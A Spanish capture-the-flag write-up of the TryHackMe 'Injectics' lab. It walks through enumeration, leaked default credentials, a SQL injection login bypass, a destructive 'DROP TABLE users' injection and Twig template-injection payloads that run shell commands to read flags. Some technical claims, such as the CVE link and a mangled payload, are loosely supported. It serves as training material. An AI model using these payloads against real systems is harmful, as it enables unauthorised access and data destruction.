# 🧩 Injectics – TryHackMe

## 📌 Introducción
En este CTF trabajaremos sobre la máquina **Injectics** de TryHackMe.  
El objetivo será aplicar técnicas de **enumeración, explotación de vulnerabilidades web e inyección de código**, hasta lograr obtener acceso y escalar privilegios.  

---

## 🔎 Paso 1 – Verificación de conectividad

Lo primero es comprobar si la máquina responde a peticiones ICMP.  

```bash
ping -c 4 10.10.105.140
```
<img width="775" height="397" alt="Ping" src="https://github.com/user-attachments/assets/6c87d9f0-f44f-4722-840c-8bf79b1d570e" />

✅ La máquina está activa y responde correctamente.
📌 El TTL=63 indica que probablemente se trate de un sistema basado en Linux.

---

## 🔎 Paso 2 – Escaneo de puertos y servicios

Con la conectividad verificada, realizamos un escaneo de puertos con **nmap** para identificar servicios expuestos.  

```bash
nmap -sV -sC 10.10.105.140
```
<img width="837" height="385" alt="nmap" src="https://github.com/user-attachments/assets/9ce24a4d-4e23-419a-a7ac-63e1ebc6e3e2" />

📌 Hallazgos importantes:

22/tcp → SSH (OpenSSH 8.2p1 en Ubuntu).

80/tcp → HTTP (Apache 2.4.41 con sitio activo: Injectics Leaderboard).

El servidor no tiene habilitado el flag httponly en la cookie de sesión → posible vector de ataque.

---

## 🌐 Paso 3 – Análisis inicial del servicio web (Puerto 80)

Accedemos al servicio HTTP en el puerto **80** desde el navegador.  

```bash
http://10.10.105.140
```
<img width="1792" height="737" alt="puerto 80" src="https://github.com/user-attachments/assets/e5fc5487-78f2-46d6-abdd-9421d792a9bb" />

Se muestra una página llamada Injectics 2024, que contiene un Leaderboard con un ranking de países y sus medallas.

📌 Observaciones:

El sitio parece ser una aplicación web deportiva.

En el encabezado existen enlaces de navegación: Home, Events, Athletes.

La tabla mostrada podría estar conectada a una base de datos → posible vector de SQL Injection.

El diseño estático no muestra formularios visibles, pero es probable que existan endpoints internos.

---

## 🔐 Paso 4 – Página de Login

Durante la navegación encontramos un formulario de autenticación en la ruta:

```bash
http://10.10.105.140/login.php
```
<img width="1219" height="601" alt="PaginaLogin" src="https://github.com/user-attachments/assets/6002efed-2cd2-4b5b-be4b-f20592090cc7" />

📌 Características del formulario:

Campos: Email y Password.

Botón principal: Submit.

Botón adicional: Login as Admin (posible bypass directo).

No parece haber validaciones de seguridad visibles en el lado del cliente.

➡️ Esto sugiere que el formulario podría ser vulnerable a SQL Injection o bien a técnicas de bypass de login mediante credenciales predeterminadas.

---

## 📂 Paso 5 – Enumeración de directorios con Gobuster

Para descubrir rutas ocultas en el servidor web ejecutamos **Gobuster** con una wordlist común (`directory-list-2.3-medium.txt`).  

```bash
gobuster dir -u http://10.10.105.140/ \
-w /home/quiqu3h4ck/Escritorio/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x txt,css,pdf,php -t 50
```
<img width="722" height="503" alt="gobuster" src="https://github.com/user-attachments/assets/f50840a6-5f5e-4f03-a4a9-0e5003a94281" />


<img width="1086" height="296" alt="gobsuter con log" src="https://github.com/user-attachments/assets/9c9232d8-701d-4118-982b-10c5b7cc6a8d" />


📌 Hallazgos importantes:

/flags/ → Posible ubicación de las flags del CTF.

/dashboard.php → Página protegida, probablemente accesible tras el login.

/phpmyadmin/ → Interfaz de administración de base de datos (muy sensible).

/vendor/ y composer.json → Indican uso de dependencias PHP con Composer.

/mail.log → Posible archivo con información importante.

---

## 📜 Paso 6 – Análisis de dependencias (composer.json)

Durante la enumeración encontramos el archivo:

```bash
http://10.10.105.140/composer.json
```
<img width="853" height="249" alt="Endpoint Composer_json version de twig" src="https://github.com/user-attachments/assets/7bde9ca4-60f3-411d-a578-2a0a5c50fef7" />

Al acceder, muestra el siguiente contenido:

{
  "require": {
    "twig/twig": "2.14.0"
  }
}

📌 Hallazgos:

El sitio utiliza Twig v2.14.0, un motor de plantillas para PHP.

Versiones antiguas de Twig son conocidas por vulnerabilidades relacionadas con Remote Code Execution (RCE) en entornos mal configurados.

El hecho de que este archivo sea accesible públicamente indica una mala configuración del servidor (exposición de información sensible).

---

## ⚠️ Paso 7 – Vulnerabilidad en Twig (CVE-2024-45411)

Tras identificar que la aplicación usa **Twig 2.14.0**, investigamos posibles vulnerabilidades asociadas.  

Encontramos el CVE:  

- **CVE-2024-45411** – *Twig Sandbox Bypass*  
- Publicado en septiembre de 2024.  
- Permite a un atacante **ejecutar código malicioso al evadir las restricciones del sandbox** de Twig.  
- La vulnerabilidad afecta a versiones:
  - Desde **2.0.0 hasta < 2.16.1**  
  - (la máquina usa **2.14.0**, que está dentro del rango vulnerable).  

Fuente: [CVE-2024-45411 – Twig Sandbox Bypass](https://www.cvedetails.com/cve/CVE-2024-45411/)  

📌 **Impacto:**
- Si la aplicación permite a usuarios enviar plantillas o inyectar código Twig, podría explotarse para lograr **Remote Code Execution (RCE)**.  
- Confirma que el servidor tiene un **vector de ataque real** aprovechando Twig.
  
<img width="1341" height="739" alt="CVE vulenerabilidad" src="https://github.com/user-attachments/assets/c1201557-94d2-407a-8692-8b5066fad4b5" />

---

## 📧 Paso 8 – Lectura de `mail.log` y obtención de credenciales

En la enumeración detectamos el archivo:

<img width="1313" height="475" alt="archivo mail log" src="https://github.com/user-attachments/assets/4c51f65b-985c-48f5-816e-bb8a13597756" />

```bash
http://10.10.105.140/mail.log
```
Su contenido revela un correo interno con credenciales por defecto insertadas automáticamente en la base de datos de usuarios:

From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Here are the default credentials that will be added:

Email: superadmin@injectics.thm
Password: superSecurePasswd101

Email: dev@injectics.thm
Password: devPasswd123

📌 Hallazgos importantes:

Existen dos usuarios válidos con contraseñas asociadas.

Se confirma que las credenciales se regeneran en la base de datos cada minuto.

Esto nos garantiza un acceso persistente incluso si se modifican o eliminan.

---

## 🛠️ Paso 9 – Acceso a phpMyAdmin

Durante la enumeración encontramos el panel de administración de bases de datos en:

<img width="911" height="735" alt="panel phpmyadmin" src="https://github.com/user-attachments/assets/3408fe3c-f4f1-447c-b168-2d7517433d9e" />

```bash
http://10.10.105.140/phpmyadmin/
```

Al acceder se muestra el login de phpMyAdmin.

📌 Observaciones:

El intento de acceso con el usuario root falla:

mysqli_real_connect(): (HY000/1045): Access denied for user 'root'@'localhost' (using password: YES)

Esto indica que root no tiene acceso remoto o su contraseña es diferente.

Dado que en mail.log obtuvimos credenciales válidas (superadmin@injectics.thm / superSecurePasswd101 y dev@injectics.thm / devPasswd123), es posible que alguno de estos usuarios tenga acceso a la interfaz.

---

## 🔍 Paso 10 – Revisión del código fuente en phpMyAdmin

Al inspeccionar el código fuente de la página de login de **phpMyAdmin**, encontramos referencias internas:

<img width="1144" height="834" alt="codigo fuente phpmyadmin" src="https://github.com/user-attachments/assets/05cdd603-5d6c-40a9-b3f9-5c2a3b947f74" />

```html
<a href="./doc/html/index.html" target="documentation">Documentation</a>
```
📌 Observaciones:

Se hace referencia a la ruta:

/phpmyadmin/doc/html/index.html

Esto podría exponer la documentación completa de phpMyAdmin.

A veces, dentro de esta documentación se filtran versiones exactas, configuraciones o incluso ejemplos de contraseñas predeterminadas.

---

## 📝 Paso 11 – Identificación de versión en phpMyAdmin

Al acceder a la documentación expuesta en:

```bash
http://10.10.105.140/phpmyadmin/doc/html/index.html
```

<img width="758" height="425" alt="version de phpmyadmin" src="https://github.com/user-attachments/assets/23e3c80f-ff32-41b1-b7a5-0811242a71a2" />

Se revela la versión exacta de phpMyAdmin en uso:

phpMyAdmin 4.9.5

📌 Observaciones:

La versión 4.9.5 es antigua y cuenta con vulnerabilidades conocidas, como XSS y problemas de configuración que pueden ser aprovechados.

La exposición pública de la documentación confirma que el servidor está mal configurado, mostrando información sensible a cualquier visitante.

---

## 🔑 Paso 12 – Intento de SQL Injection en el login

Decidimos probar un **bypass clásico de autenticación** con SQL Injection:

<img width="876" height="358" alt="filtros del lado del cliente para inyeccion" src="https://github.com/user-attachments/assets/b853b7f5-9deb-4aa6-957c-196e78e8e39c" />

```sql
' OR 1=1 --
```
📌 Resultado:

El sistema devuelve un mensaje de error:

Invalid keywords detected

Esto confirma que el formulario aplica filtros de entrada del lado del servidor, bloqueando cadenas sospechosas como OR 1=1.

No obstante, este tipo de filtros suele ser bypassable usando técnicas como:

Variaciones de mayúsculas/minúsculas (oR 1=1--).

Comentarios alternativos (#, /* ... */).

Codificación en URL (%27%20OR%201=1--).

Inyecciones basadas en tiempo o booleanas.

---

## 🕵️ Paso 13 – Revisión del código fuente de `login.php`

Al inspeccionar el código fuente del formulario de login, encontramos información sensible:

<img width="747" height="832" alt="codigo fuente pag principal filtro js" src="https://github.com/user-attachments/assets/5c041279-0428-4212-8651-d6fcf6f9fd1d" />

```html

<script type="text/javascript" src="script.js"></script>
```
📌 Hallazgos:

Se carga el archivo script.js, que probablemente contiene las reglas de validación/filtro que bloquearon nuestros intentos de SQL Injection.

---

## 🛡️ Paso 14 – Análisis de los filtros en `script.js`

Al acceder al archivo:

```bash
http://10.10.105.140/script.js
```
<img width="861" height="602" alt="filtros en el js" src="https://github.com/user-attachments/assets/d0a41732-58a2-445d-aa38-a4ffc372ac21" />

Encontramos el siguiente código:

const invalidKeywords = ['or', 'and', 'union', 'select', "'", '"'];
for (let keyword of invalidKeywords) {
    if (username.includes(keyword)) {
        alert('Invalid keywords detected');
        return false;
    }
}

📌 Hallazgos:

El filtrado de inyecciones SQL se realiza en JavaScript del lado del cliente.

Palabras como or, and, union, select, ' y " están bloqueadas.

Esto explica el error mostrado al intentar usar ' OR 1=1--.

Sin embargo, este tipo de validaciones son triviales de bypassear enviando la petición manualmente sin pasar por el navegador (ejemplo: Burp Suite, curl, Python requests).

---

## 💉 Paso 15 – Bypass del filtro y SQL Injection con Burp Suite

Dado que el filtro de SQL estaba implementado en **JavaScript del lado del cliente** (`script.js`), lo interceptamos con **Burp Suite** y enviamos la petición manualmente al backend.

<img width="1235" height="374" alt="burpsuite para login" src="https://github.com/user-attachments/assets/7b271e7f-877a-4b92-b040-1141b13c6b23" />

### Payload utilizado
```sql
username=a'27 || 1=1 -- &password=&function=login
```

Respuesta del servidor
{
  "status": "success",
  "message": "Login successful",
  "is_admin": "true",
  "first_name": "dev",
  "last_name": "dev",
  "redirect_link": "dashboard.php?isadmin=false"
}

📌 Hallazgos:

El backend sí era vulnerable a SQL Injection.

Logramos autenticarnos como usuario administrador (dev).

El sistema confirma acceso exitoso con rol admin.

El filtro en el cliente resultó inútil, ya que no afectaba al servidor directamente.

---

## 🖥️ Paso 16 – Acceso al dashboard como usuario `dev`

Tras explotar la inyección SQL, logramos autenticarnos y acceder al **dashboard**.  

<img width="814" height="519" alt="entramos pagina usuariodev" src="https://github.com/user-attachments/assets/f79f6886-1ae7-4b7a-96b7-29a3c5bdd9fe" />

La interfaz muestra un mensaje de bienvenida:  

```plaintext
Welcome, dev!
```
Además, se despliega una tabla con el Leaderboard, similar a la vista pública, pero esta vez con opciones adicionales:

Botón Edit en cada fila → posibilidad de modificar valores.

📌 Hallazgos:

Hemos confirmado acceso al panel interno de la aplicación.

El rol de usuario dev tiene permisos de edición, lo que puede permitir inyección en formularios o manipulación de datos sensibles.

Este será probablemente el vector hacia la escalada de privilegios.

---

## 🧨 Paso 17 – SQL Injection en `edit_leaderboard.php`

Al editar un registro desde el dashboard, interceptamos la petición con **Burp Suite** y manipulamos los parámetros enviados al backend.

<img width="1094" height="399" alt="burtpsuite inyeccion romper BBDD" src="https://github.com/user-attachments/assets/7a7a5ae1-ccda-465c-856b-df5ff698f02a" />

### Petición interceptada:

```http
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.105.140
Content-Type: application/x-www-form-urlencoded

rank=1&country=USA&gold=22; DROP TABLE users --;&silver=21&bronze=12345
```
Respuesta:
HTTP/1.1 302 Found
Location: dashboard.php

📌 Hallazgos:

La aplicación permite inyectar directamente sentencias SQL maliciosas.

En este ejemplo se intentó ejecutar un DROP TABLE users.

Aunque la respuesta fue un 302 Redirect a dashboard.php, esto confirma que el backend recibe sin sanitizar los parámetros enviados.

La aplicación es vulnerable a SQL Injection en edición de datos, lo cual puede explotarse para extraer información sensible o alterar la base de datos.

---

## 🔄 Paso 18 – Restauración automática de la base de datos

Tras lanzar un payload destructivo en la inyección SQL (`DROP TABLE users`), la aplicación dejó de funcionar correctamente.  
Al intentar cargar de nuevo la página, se mostró el siguiente mensaje:

<img width="905" height="227" alt="hemos roto la bBDD" src="https://github.com/user-attachments/assets/230cd3cc-7c55-45e8-be07-46def31ca00a" />

```plaintext
Seems like database or some important table is deleted. 
InjecticsService is running to restore it. Please wait for 1-2 minutes.
```
📌 Hallazgos:

Existe un servicio interno llamado InjecticsService.

Este servicio se encarga de restaurar automáticamente la base de datos en caso de corrupción o eliminación de tablas.

Esto confirma que la máquina está diseñada para que el atacante pueda experimentar libremente con inyecciones destructivas, sin necesidad de reiniciar manualmente el entorno.

---

## 🏁 Paso 19 – Acceso como administrador y obtención de la primera flag

Con las credenciales encontradas en `mail.log`:

<img width="939" height="432" alt="primera bandera" src="https://github.com/user-attachments/assets/70126ddc-0c12-4173-866e-0856b5f9d884" />

```plaintext
Usuario: superadmin@injectics.thm
Contraseña: superSecurePasswd101
```

Accedimos al login principal (login.php) y esta vez entramos al dashboard como administrador.

📌 Hallazgos:

El mensaje de bienvenida confirma el rol admin:

Welcome, admin!

En el panel aparece la primera flag del CTF:

THM{***************}

➡️ Con esto hemos logrado la primera etapa del CTF. El siguiente paso será continuar explorando el dashboard y los privilegios de admin para localizar más flags o vulnerabilidades que permitan una escalada a nivel de sistema.

---

## 👤 Paso 20 – Nueva sección "Profile" en el panel de administrador

Una vez logueados como **admin**, el dashboard muestra nuevas opciones en la barra de navegación:

- **Home**
- **Profile**
- **Logout**

📌 **Observaciones:**
- La opción **Profile** no estaba disponible en el panel del usuario `dev`.  
- Es probable que desde aquí podamos ver información sensible, modificar datos del administrador o incluso encontrar otra **flag**.  

<img width="1021" height="197" alt="panel del admin nueva seccion profile" src="https://github.com/user-attachments/assets/da13e77d-24c0-4177-b0bf-5f8bc350555e" />

---

## 🧩 Paso 21 – Server-Side Template Injection (SSTI) en Profile

Dentro del panel de administración, en la sección **Profile**, encontramos un formulario para actualizar los datos del superadmin:

- **Email**
- **First Name**
- **Last Name**

Al inyectar el payload de prueba:

```twig
{{7*7}}
```
<img width="831" height="459" alt="inyeccion sql" src="https://github.com/user-attachments/assets/047aa87d-e245-45b1-8611-0886bc286558" />

<img width="1021" height="145" alt="comprobando la inyeccion pag admin" src="https://github.com/user-attachments/assets/d3e78210-e122-4687-8afc-0e499fdd6b8a" />

El sistema lo interpretó y devolvió el resultado 49, confirmando que la aplicación utiliza el motor Twig y es vulnerable a SSTI.

📌 Hallazgos:

Twig 2.14.0 ya se había identificado previamente en composer.json.

Esta versión es vulnerable al CVE-2024-45411 (sandbox bypass).

Ahora tenemos un punto de entrada directo para ejecutar código arbitrario en el servidor.

---

## ⚡ Paso 22 – Explotación de SSTI en Twig para RCE

Tras confirmar que el formulario de **Profile** era vulnerable a **Server-Side Template Injection (SSTI)**, probamos payload real de SSTI en Twig, tomado de PayloadsAllTheThings, con el cual puedes ejecutar funciones como passthru() **ejecución de comandos en el servidor**.

<img width="828" height="396" alt="inyectamos ssti del repositorio PayloadAllTheThings de Github" src="https://github.com/user-attachments/assets/d01f3162-405e-490c-a20d-0875443361bd" />

```twig
{{['id',1]|sort('passthru')|join}}
```

📌 Hallazgos:

El payload usa el filtro sort para forzar la llamada a la función passthru.

Esto permite ejecutar comandos del sistema directamente desde el campo vulnerable.

Confirma que la vulnerabilidad de Twig 2.14.0 (CVE-2024-45411) es explotable y nos da control sobre el sistema.

---

## 🖥️ Paso 23 – Ejecución de comandos con SSTI

Tras explotar la vulnerabilidad SSTI en Twig, probamos la ejecución del comando:

<img width="1001" height="151" alt="entramos root" src="https://github.com/user-attachments/assets/1b54cea0-df16-4019-9073-40322562d83b" />

```bash
id
```
📌 Resultado:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Esto confirma que tenemos ejecución de comandos en el servidor bajo el usuario www-data (el proceso por defecto del servidor web Apache en Ubuntu).

---

## 📂 Paso 24 – Búsqueda de archivos en el sistema

Con el acceso RCE vía SSTI, lanzamos un comando para buscar archivos `.txt` en todo el sistema:

<img width="760" height="244" alt="lectura de archivos" src="https://github.com/user-attachments/assets/d852a7c8-8997-4dff-bae6-97a16c9f976e" />

```twig
{{['find / -type f -name "*.txt" 2>/dev/null',1] | sort('passthru') | join}}
```

📌 Hallazgos:

Este payload ejecuta el comando find para listar archivos con extensión .txt, redirigiendo los errores a /dev/null para evitar ruido en la salida.

Esto nos permitirá ubicar posibles flags o archivos de configuración sensibles (contraseñas, notas del administrador, etc.).

---

## 🏴 Paso 25 – Localización de la segunda flag

Con el comando `find` identificamos un archivo sospechoso en el directorio de la web:

<img width="972" height="290" alt="archivo encontrado" src="https://github.com/user-attachments/assets/3e39be92-d9dd-4a0c-8740-912e8eabda4c" />

```plaintext
/var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

📌 Observaciones:

El archivo se encuentra dentro de la ruta /var/www/html/flags/, que ya habíamos descubierto en la enumeración con Gobuster.

El nombre largo en formato hash confirma que se trata de un archivo diseñado como flag.

Ahora que tenemos ejecución remota de comandos vía Twig, podemos leer su contenido para obtener la flag.

---

## 🏆 Paso 26 – Lectura de la segunda flag

Tras localizar el archivo en `/var/www/html/flags/`, utilizamos la vulnerabilidad SSTI para ejecutar un `cat` y leer su contenido:

Payload:
```twig
{{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',1] | sort('passthru') | join}}
```

<img width="1015" height="251" alt="inyectando carga para leer" src="https://github.com/user-attachments/assets/830fc4e0-7411-4159-bbfa-ff2c7ecb9a5d" />

📌 Resultado:

Se muestra el contenido del archivo en la respuesta del navegador.

Obtenemos así la segunda flag del CTF:

<img width="1009" height="160" alt="segunda bandera" src="https://github.com/user-attachments/assets/55019555-6715-47fc-b236-5fdeb0e8a6de" />





